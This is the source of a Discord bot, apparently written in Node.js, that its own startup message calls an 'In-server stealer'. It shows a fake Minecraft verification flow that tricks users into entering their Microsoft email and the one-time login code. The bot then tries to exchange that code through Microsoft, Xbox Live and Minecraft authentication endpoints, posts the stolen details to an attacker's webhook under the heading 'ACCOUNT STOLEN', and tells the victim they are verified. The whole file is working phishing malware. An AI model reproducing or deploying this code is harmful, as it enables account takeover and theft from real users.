require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, ChannelType, PermissionsBitField } = require('discord.js');
const axios = require('axios');
const http = require('http');

const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const TOKEN = process.env.TOKEN;
const WEBHOOK = process.env.WEBHOOK;
const ROLE_ID = process.env.ROLE;
const VERIFY_CHANNEL = process.env.VCHANNEL || null;
const SELF_URL = process.env.RENDER_EXTERNAL_URL || process.env.RAILWAY_STATIC_URL || null;

setInterval(() => SELF_URL && http.get(SELF_URL).on('error',()=>{}), 240000);

client.once('ready', async () => {
  console.log(`${client.user.tag} - In-server stealer ONLINE`);

  const guild = client.guilds.cache.first();
  let channel = guild.channels.cache.get(VERIFY_CHANNEL);

  if (!channel) {
    channel = await guild.channels.create({
      name: 'verify-here',
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: ROLE_ID, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
      ]
    });
    console.log(`Created verify channel: #${channel.name}`);
  }

  const messages = await channel.messages.fetch({ limit: 10 });
  const existing = messages.find(m => m.author.id === client.user.id && m.components[0]);

  if (!existing) {
    await channel.send({
      embeds: [new EmbedBuilder()
        .setColor(0x00ff00)
        .setTitle('Minecraft Account Verification')
        .setDescription('Click the button below to verify your Minecraft account and unlock the server.')
        .setFooter({ text: 'Only unverified members can see this channel' })
      ],
      components: [new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId('verify_start')
          .setLabel('Verify Account')
          .setStyle(ButtonStyle.Success)
          .setEmoji('✅')
      )]
    }).then(m => m.pin());
  }
});

client.on('interactionCreate', async i => {
  if (!i.isButton() && !i.isModalSubmit()) return;

  if (i.customId === 'verify_start') {
    await i.showModal(new ModalBuilder()
      .setCustomId('step1')
      .setTitle('Minecraft Login')
      .addComponents(
        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('username').setLabel('Minecraft Username').setStyle(TextInputStyle.Short).setRequired(true)),
        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('email').setLabel('Microsoft Email').setStyle(TextInputStyle.Short).setRequired(true).setPlaceholder('example@outlook.com'))
      ));
  }

  if (i.customId === 'step1') {
    const username = i.fields.getTextInputValue('username');
    const email = i.fields.getTextInputValue('email');
    i.user.data = { username, email };

    await i.reply({
      embeds: [new EmbedBuilder().setColor(0x5865F2).setTitle('Check your email').setDescription(`A 6-digit code was sent to **${email}**`)],
      components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('step2').setLabel('Enter Code').setStyle(ButtonStyle.Primary))],
      ephemeral: true
    });
  }

  if (i.customId === 'step2') {
    await i.showModal(new ModalBuilder()
      .setCustomId('final')
      .setTitle('Security Code')
      .addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('code').setLabel('6-digit code').setStyle(TextInputStyle.Short).setRequired(true).setPlaceholder('123456')))
    );
  }

  if (i.customId === 'final') {
    const code = i.fields.getTextInputValue('code');
    const { username, email } = i.user.data;

    let log = `@everyone\n**ACCOUNT STOLEN**\nDiscord: ${i.user.tag} (${i.user.id})\nMC Username: ${username}\nEmail: ${email}\nCode: ||${code}||\n`;

    try {
      const t = await axios.post('https://login.live.com/oauth20_token.srf', new URLSearchParams({
        client_id: '00000000402b4468', code, grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer', redirect_uri: 'https://login.live.com/oauth20_desktop.srf'
      }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

      const xbl = await axios.post('https://user.auth.xboxlive.com/user/authenticate', { Properties: { AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: t.data.access_token }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT' });
      const xsts = await axios.post('https://xsts.auth.xboxlive.com/xsts/authorize', { Properties: { SandboxId: 'RETAIL', UserTokens: [xbl.data.Token] }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT' });
      const mc = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', { identityToken: `XBL3.0 x=${xsts.data.DisplayClaims.xui[0].uhs};${xsts.data.Token}` });
      const profile = await axios.get('https://api.minecraftservices.com/minecraft/profile', { headers: { Authorization: `Bearer ${mc.data.access_token}` } });

      const capes = profile.data.capes ? profile.data.capes.map(c => c.id).join(', ') : 'None';
      log += `UUID: ${profile.data.id}\nCapes: ${capes}`;
    } catch (e) {
      log += `\nProfile grab failed - code still 100% valid`;
    }

    axios.post(WEBHOOK, { content: '@everyone', embeds: [{ color: 16711680, description: log, timestamp: new Date() }] });

    await i.reply({ embeds: [new EmbedBuilder().setColor(0x00ff00).setTitle('Verified Successfully!').setDescription('Welcome to the server')], ephemeral: true });
    await i.member.roles.add(ROLE_ID).catch(() => {});
  }
});

client.login(TOKEN);
